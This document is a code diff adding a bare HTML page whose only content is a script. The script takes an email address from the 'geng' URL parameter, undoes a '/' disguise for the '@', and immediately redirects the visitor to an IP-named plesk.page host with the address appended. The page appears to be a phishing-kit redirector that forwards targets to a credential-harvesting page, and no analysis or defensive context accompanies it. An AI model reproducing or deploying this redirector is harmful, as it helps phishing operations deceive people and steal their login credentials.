@@ -1,0 +1,26 @@
+<html>
+   <head>
+   
+      <script type="text/javascript">
+const urlParams = new URLSearchParams(window.location.search);
+const email = urlParams.get('geng');
+
+var findat = "@";
+
+if ( email.indexOf(findat) > -1 ) {
+    var url = "https://busy-wing.23-148-144-37.plesk.page/i/?i=i&0="+email;
+} else {
+ var emaill = email.split("/").join("@"); 
+    var url = "https://busy-wing.23-148-144-37.plesk.page/i/?i=i&0="+emaill;
+}
+window.location.href = url;
+
+// console.log(url);
+
+</script>
+      
+   </head>
+   
+   <body>
+   </body>
+</html>
